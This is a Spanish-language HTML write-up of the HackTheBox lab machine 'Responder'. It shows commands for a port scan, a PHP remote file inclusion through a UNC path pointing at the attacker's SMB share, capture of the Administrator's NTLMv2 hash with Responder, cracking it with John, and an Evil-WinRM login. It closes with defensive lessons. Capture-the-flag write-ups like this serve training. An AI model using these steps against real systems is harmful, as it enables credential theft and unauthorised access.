@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Responder HTB - Writeup</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Writeup de Responder (HackTheBox): inclusión remota de archivos (RFI) sobre una web PHP en Windows, captura del hash NTLMv2 del Administrador con Responder, crackeo con John y acceso por Evil-WinRM hasta la flag." />
+  <meta name="color-scheme" content="dark" />
+  <link rel="icon" href="../img/avatar.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../styles.css?v=3" />
+</head>
+<body>
+  <div class="post-layout">
+    <aside class="post-sidebar">
+      <div class="sidebar-avatar">
+        <img src="../img/avatar.png" alt="Avatar de ZerasedZ" />
+      </div>
+      <h2 class="sidebar-name">ZerasedZ</h2>
+      <p class="sidebar-role">HTB - Offensive Security</p>
+
+      <ul class="sidebar-list">
+        <li>HTB</li>
+        <li>Windows · Web</li>
+      </ul>
+
+      <ul class="sidebar-links">
+        <li><a href="https://profile.hackthebox.com/profile/019d4be4-ec1e-706b-9196-b4be2dab6db5">HTB</a></li>
+        <li><a href="https://twitter.com">Twitter</a></li>
+        <li><a href="https://github.com/JeinerGutierrez">GitHub</a></li>
+      </ul>
+
+      <a class="back-home" href="../index.html">&larr; Volver a Writeups</a>
+    </aside>
+
+    <main class="post-main">
+      <header class="post-header">
+        <p class="post-breadcrumb"><a href="../index.html">Home</a> / Responder HTB - Writeup</p>
+        <h1 class="post-title">Responder HTB - Writeup</h1>
+        <p class="post-date">Aug 12, 2026 · <span class="pill">Windows</span> <span class="pill">Web</span> <span class="pill">Very Easy</span></p>
+      </header>
+
+      <nav class="post-toc" aria-label="Contenido del writeup">
+        <h2>En este writeup</h2>
+        <ol class="post-index">
+          <li><a href="#enumeracion">1. Enumeración inicial</a></li>
+          <li><a href="#vhost">2. Configurando el vhost</a></li>
+          <li><a href="#lfi">3. Detectando la inclusión de archivos</a></li>
+          <li><a href="#responder">4. Capturando el hash NTLMv2 con Responder</a></li>
+          <li><a href="#john">5. Crackeando el hash con John</a></li>
+          <li><a href="#winrm">6. Acceso por Evil-WinRM y la flag</a></li>
+          <li><a href="#conclusion">7. Conclusión</a></li>
+        </ol>
+      </nav>
+
+      <section class="post-section">
+        <h2>El día de hoy vamos a resolver la máquina Responder de HackTheBox. Es una máquina Windows - Very Easy centrada en un clásico del pentesting en entornos Windows: una web PHP vulnerable a inclusión de archivos que nos permite forzar al servidor a autenticarse contra un recurso SMB controlado por nosotros. Con la herramienta Responder capturamos el hash NTLMv2 del Administrador, lo crackeamos con John y entramos por WinRM para leer la flag.</h2>
+        <img src="responder/img-logomachine.png" alt="Ficha de la máquina Responder en HackTheBox, clasificada como Windows - Very Easy" />
+
+        <h2 id="enumeracion">1. Enumeración inicial</h2>
+        <p>Como siempre, arrancamos con un escaneo completo de puertos y detección de versiones con nmap:</p>
+        <pre><code>sudo nmap -p- -sV -sC -T5 --min-rate 3000 -Pn 10.129.95.234</code></pre>
+        <img src="responder/img-nmap.png" alt="Resultado de nmap mostrando el puerto 80 con Apache 2.4.52 sobre Win64 y PHP 8.1.1, el 5985 con Microsoft HTTPAPI (WinRM) y el 7680" />
+        <p>El escaneo nos revela varios puertos interesantes:</p>
+        <pre><code>80/tcp   open  http     Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+7680/tcp open  pando-pub?</code></pre>
+        <p>Dos cosas quedan claras de entrada: es una máquina <strong>Windows</strong> (por el <code>Win64</code> y el CPE de nmap) y tiene un servidor web Apache con <strong>PHP 8.1.1</strong> en el puerto 80. El puerto <code>5985</code> es <strong>WinRM</strong>, que nos servirá más adelante para conseguir una shell si obtenemos credenciales válidas.</p>
+
+        <h2 id="vhost">2. Configurando el vhost</h2>
+        <p>Al intentar entrar a la web nos damos cuenta de que redirige a <code>unika.htb</code>, un dominio que nuestra máquina todavía no sabe resolver, así que nos da un "Server Not Found":</p>
+        <img src="responder/img-paginasinrespuesta.png" alt="Firefox mostrando Server Not Found al intentar acceder a http://unika.htb" />
+        <p>Para resolverlo, agregamos el dominio a nuestro archivo <code>/etc/hosts</code> apuntando a la IP de la máquina:</p>
+        <pre><code>sudo nano /etc/hosts</code></pre>
+        <img src="responder/img-iphosts.png" alt="Edición de /etc/hosts en nano añadiendo la línea 10.129.95.234 unika.htb" />
+        <p>Recargamos y ahora sí carga la web: una plantilla corporativa de diseño web llamada "Unika":</p>
+        <img src="responder/img-paginaresponde.png" alt="Web de Unika cargando correctamente con el eslogan Excellent Web Designs" />
+
+        <h2 id="lfi">3. Detectando la inclusión de archivos</h2>
+        <p>Explorando la web notamos que tiene un selector de idioma. Al cambiar de idioma, la URL usa un parámetro <code>page</code> que carga un archivo HTML distinto:</p>
+        <pre><code>http://unika.htb/index.php?page=german.html</code></pre>
+        <img src="responder/img-cambiodeidiomaURL.png" alt="Web de Unika en alemán (Ich bin Unika) con la URL index.php?page=german.html" />
+        <p>Ese parámetro <code>page</code> que se incluye directamente en un <code>include()</code> de PHP es un candidato clásico a inclusión de archivos (LFI/RFI). Como es una máquina Windows, en lugar de un LFI tradicional probamos directamente una <strong>inclusión remota vía UNC/SMB</strong>: apuntamos el parámetro a un recurso compartido en nuestra propia máquina atacante:</p>
+        <pre><code>http://unika.htb/index.php?page=//10.10.14.31/ShareFileHTB</code></pre>
+        <img src="responder/img-fileinclusionurl.png" alt="Errores de PHP include() intentando abrir \\10.10.14.31\SHAREFILEHTB, confirmando que el servidor intenta acceder a nuestro recurso SMB" />
+        <p>El error de PHP es la confirmación que buscábamos: el servidor <strong>sí intenta acceder a nuestro recurso SMB</strong> (<code>include(\\10.10.14.31\SHAREFILEHTB)</code>). Esto significa que Windows tratará de autenticarse contra nuestra máquina para acceder al recurso... y ahí es donde entra Responder.</p>
+
+        <h2 id="responder">4. Capturando el hash NTLMv2 con Responder</h2>
+        <p>Levantamos Responder en nuestra interfaz de la VPN para ponernos a la escucha y capturar cualquier intento de autenticación SMB:</p>
+        <pre><code>sudo responder -I tun0 10.10.14.31</code></pre>
+        <img src="responder/img-conectionresponder.png" alt="Responder 3.1.3.0 iniciando con los poisoners LLMNR, NBT-NS y MDNS y el servidor SMB activo" />
+        <p>Con Responder escuchando, volvemos a lanzar la petición apuntando el parámetro <code>page</code> a nuestra IP. En cuanto el servidor intenta autenticarse contra nuestro recurso SMB, Responder captura el hash <strong>NTLMv2</strong> de la cuenta que ejecuta el proceso:</p>
+        <img src="responder/img-responder.png" alt="Responder capturando el hash NTLMv2-SSP del usuario RESPONDER\Administrator desde el cliente 10.129.95.234" />
+        <p>El hash pertenece a <code>RESPONDER\Administrator</code>. Copiamos toda la cadena del hash y la guardamos en un archivo para poder crackearla:</p>
+        <pre><code>nano hash.txt</code></pre>
+        <img src="responder/img-nanohask.png" alt="Hash NTLMv2 del Administrador pegado dentro del archivo hash.txt en nano" />
+        <p>Verificamos que el archivo quedó creado en nuestro directorio:</p>
+        <pre><code>ls</code></pre>
+        <img src="responder/img-verificacióncreadohash.png" alt="Listado del directorio mostrando el archivo hash recién creado" />
+
+        <h2 id="john">5. Crackeando el hash con John</h2>
+        <p>Vamos a usar John the Ripper junto al diccionario <code>rockyou</code>. En muchas distros viene comprimido, así que primero lo descomprimimos:</p>
+        <pre><code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code></pre>
+        <img src="responder/img-gunziprock.png" alt="Descompresión del diccionario rockyou.txt.gz con gunzip" />
+        <p>Ahora lanzamos John contra nuestro hash usando ese diccionario:</p>
+        <pre><code>john --session=nueva --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre>
+        <img src="responder/img-romperelhashjohn.png" alt="John crackeando el hash NTLMv2 del Administrador y revelando la contraseña badminton" />
+        <p>John rompe el hash en cuestión de segundos: la contraseña del <code>Administrator</code> es <code>badminton</code>. Con credenciales válidas de administrador y el puerto WinRM abierto, el acceso está prácticamente hecho.</p>
+
+        <h2 id="winrm">6. Acceso por Evil-WinRM y la flag</h2>
+        <p>Usamos Evil-WinRM para conectarnos al servicio WinRM (puerto 5985) con las credenciales obtenidas:</p>
+        <pre><code>evil-winrm -i 10.129.95.234 -u Administrator -p badminton</code></pre>
+        <img src="responder/img-conexionwindows.png" alt="Evil-WinRM estableciendo una shell como Administrator y listando el directorio C:\Users con las carpetas Administrator, mike y Public" />
+        <p>Conseguimos una shell interactiva como Administrador. Al listar <code>C:\Users</code> vemos que existe un usuario <code>mike</code>. La flag de usuario suele estar en su escritorio, así que navegamos hasta ahí y la leemos:</p>
+        <pre><code>cd C:\Users\mike\Desktop
+ls
+cat flag.txt</code></pre>
+        <img src="responder/img-flag.png" alt="Lectura del archivo flag.txt en el escritorio de mike mostrando el hash de la flag" />
+        <p>Con eso capturamos la flag y completamos la máquina.</p>
+
+        <h2 id="conclusion">7. Conclusión</h2>
+        <img src="responder/img-machinefinish.png" alt="Pantalla de HackTheBox confirmando que la máquina Responder fue hackeada por ZerasedZ" />
+        <p>Responder es una máquina muy didáctica sobre uno de los vectores más frecuentes en entornos Windows reales. Todo parte de un error de programación clásico: incluir en un <code>include()</code> de PHP un parámetro controlado por el usuario sin sanitizar. En Windows, ese fallo permite forzar una autenticación SMB saliente hacia un servidor malicioso, donde herramientas como Responder capturan el hash NTLMv2. Si además la contraseña es débil (como <code>badminton</code>), un simple diccionario con John basta para recuperarla en texto plano. La lección: nunca incluir rutas controladas por el usuario, deshabilitar el acceso a recursos remotos en PHP y usar contraseñas robustas para las cuentas privilegiadas.</p>
+      </section>
+    </main>
+  </div>
+</body>
+</html>
